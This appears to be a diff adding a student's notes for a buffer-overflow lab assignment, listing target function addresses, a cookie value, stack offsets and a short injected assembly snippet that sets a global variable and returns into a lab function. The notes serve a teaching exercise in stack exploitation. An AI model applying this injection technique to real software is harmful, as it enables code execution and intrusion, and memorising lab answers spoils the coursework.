@@ -1,0 +1,53 @@
+chme1558 cookie: 0x160671a6
+
+phase 0:
+Location smoke(): 0x08048b68 68 8b 04 08
+eax: 0x55683cc8 0x61f4cfeb
+getbuf returns to: 0x08048d94
+
+ebp: 0x55683cf0
+(ebp+4-0x55683cc8): 0x2c = 44
+
+phase 1:
+loc fizz: 0x08048b92
+
+Phase 2:
+disas bang
+info var
+loc global_value: 0x0804d104
+
+info func
+loc bang: 0x08048bed
+
+	code:
+
+changes on 29th C for b3  0x08048c76 in Gets ()
+
+
+	movl $0x160671a6, 0x804d104 #movl $cookie, global_val
+	pushl $0x8048bed  	    #loc of bang()
+	ret
+
+objdump -d firecracker.o > firecracker.d
+  
+0x08048c04 <+23>:	movl   $0x804a264,0x4(%esp)
+				address must contain your cookie
+loc of input string: 0x55683cc8
+
+Phase 3:
+
+Val stored in EBP: 0x44434241
+EAX must be: EBP-0xc: 0x55683cf0
+EBP-0xc: 0xf7fbaa20
+
+ebp before gets 0x55683d20
+
+ebp after gets 0x55683cf0 
+contains 0x55683d20
+should ret to 0x08048d94 in test
+esp stores 0x08048d94
+
+right now esp is containing 0x8048d00
+
+
+
